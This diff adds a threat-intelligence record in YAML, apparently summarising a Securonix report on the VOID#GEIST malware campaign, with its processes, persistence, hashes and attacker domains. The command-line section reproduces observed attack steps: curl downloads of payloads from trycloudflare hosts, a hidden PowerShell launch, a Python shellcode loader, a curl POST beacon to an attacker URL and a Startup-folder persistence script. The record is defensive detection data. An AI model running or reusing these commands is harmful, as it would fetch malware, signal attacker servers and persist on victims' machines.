@@ -1,0 +1,88 @@
+description: VOID#GEIST utilizes script-based malware delivery framework with fileless
+  execution, leveraging benign scripting techniques and encrypted shellcode payloads.
+malware_families:
+- XWorm
+- XenoRAT
+- AsyncRAT
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - chrome.exe
+  - AppInstallerPythonRedirector.exe
+  - python.exe
+  - explorer.exe
+  commandline:
+  - cmd.exe /c C:\\Users\\usere\\Desktop\\non.bat
+  - powershell -WindowStyle Hidden -Command Start-Process -FilePath non.bat -ArgumentList
+    h -WindowStyle Hidden
+  - curl -s -o %TEMP%\\01.zip https://staying-heavily-meaning-blowing.trycloudflare.com/01.zip
+  - curl -o py.zip https://www.python.org/ftp/python/3.10.0/python-3.10.0-embed-amd64.zip
+  - python runn.py -p new.bin -k a.json
+  - timeout /t 5 /nobreak
+  - curl -X POST -d status=success https://servers-johnson-rebate-recipes.trycloudflare[.]com/a.txt
+  - cmd.exe /c ...\Startup\spol.bat
+  - cmd.exe /K ...\Startup\spol.bat min
+  powershell:
+  - Start-Process -FilePath non.bat -ArgumentList h -WindowStyle Hidden
+  scripting_engine:
+  - Python
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - non.bat -> staying-heavily-meaning-blowing.trycloudflare.com
+  - 01.zip -> servers-johnson-rebate-recipes.trycloudflare.com
+  - python.org -> www.python.org
+  - TryCloudflare -> staying-heavily-meaning-blowing.trycloudflare.com
+  - explorer.exe, servers-johnson-rebate-recipes.trycloudflare[.]com, 443
+  file_activity:
+  - C:\\Users\\usere\\Desktop\\non.bat
+  - '%TEMP%\\01.zip'
+  - '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\spol.bat'
+  - py.zip
+  - runn.py
+  - new.bin
+  - xn.bin
+  - pul.bin
+  - a.json
+  - n.json
+  - p.json
+  - '...\Startup\spol.bat'
+  persistence:
+  - Deployment of spol.bat in Startup folder
+  - Startup script execution
+  process_relations:
+  - cmd.exe -> non.bat
+  - powershell.exe -> non.bat
+  - python.exe -> runn.py
+IOCs:
+  hashes:
+  - b9d2329e5d321463c9d2460b48daed97085cabb119ea88644454256f9df9f986
+  - 034f395c925ffec9275eed37e3c16c44ecc11f790796d7c21186993a997a0753
+  - ac96f69de7ba8c03041985e27e277597cf7b4779a9f64fc701d10324823e33c9
+  - 002ba6ca8c0f8c66582e33d4994f1ade54719b50dd6aecbd2007adec52587852
+  - 4702c4c2ff40db97d64ef2fa2500729cbb6c60731b2d5af134c94e1aee327a4d
+  - b58963f04909361cb414b1ba2215cde6aff014408e27c6a16527db903807e301
+  - bfcee31a0b295c94dfab47e2dd05cfc4c2e768eb0c58cbe0b12bec69ee4ee7b3
+  - ecedbf56c7cefeef063c8fad1e6048a3a8743c00295711f0223b3a25cc9459ca
+  - 4a699440e28f9a01d9046e4bc249c7148bce5b985caf974fd4d250e40387ebbb
+  - e2d167b31e0fd0429cc8ec2a0878a83e728b85f05c6afd8e2b8a7a4736866f59
+  - 0edb5487c4afdb39482b2f5422997b80dbf4bb0b698a83af5b5723403fd83c3e
+  ip_addresses: []
+  domains:
+  - staying-heavily-meaning-blowing.trycloudflare.com
+  - servers-johnson-rebate-recipes.trycloudflare.com
+  - www.python.org
+  - servers-johnson-rebate-recipes.trycloudflare[.]com
+  urls:
+  - http://staying-heavily-meaning-blowing.trycloudflare.com/non.bat
+  - https://staying-heavily-meaning-blowing.trycloudflare.com/01.zip
+  - https://www.python.org/ftp/python/3.10.0/python-3.10.0-embed-amd64.zip
+  - https://servers-johnson-rebate-recipes.trycloudflare[.]com/a.txt
+authors:
+- Akshay Gaikwad
+- Shikha Sangwan
+- Aaron Beardslee
+reference: https://www.securonix.com/blog/voidgeist-stealthy-multi-stage-python-loader
+date_of_publication: March 08, 2026
+file_creation_date: March 08, 2026
